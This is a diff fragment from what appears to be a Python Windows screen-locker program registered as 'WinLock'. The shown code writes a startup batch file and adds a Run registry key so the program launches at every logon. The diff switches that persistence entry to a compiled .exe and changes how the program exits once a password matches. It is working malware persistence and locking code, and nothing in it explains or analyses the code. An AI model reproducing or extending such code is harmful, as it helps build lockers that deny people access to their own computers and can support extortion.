@@ -34,7 +34,7 @@ def add_to_startup(file_path=""):
     with open(bat_path + '\\' + "project.bat", "w+") as bat_file:
         bat_file.write(r'%s\project.py' % file_path)
     key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run')
-    _winreg.SetValueEx(key,'WinLock',1,_winreg.REG_SZ,r'%s\project.py' % file_path) 
+    _winreg.SetValueEx(key,'WinLock',1,_winreg.REG_SZ,r'%s\project.exe' % file_path) 
     key.Close()
 
 
@@ -50,7 +50,7 @@ def check(event=None):
     text = my_string.get()
     my_string.set("")
     if text == password:
-        exit(0)
+        os._exit(0)
 
 def qkey(event=None):
     text = my_string.get()+'1'
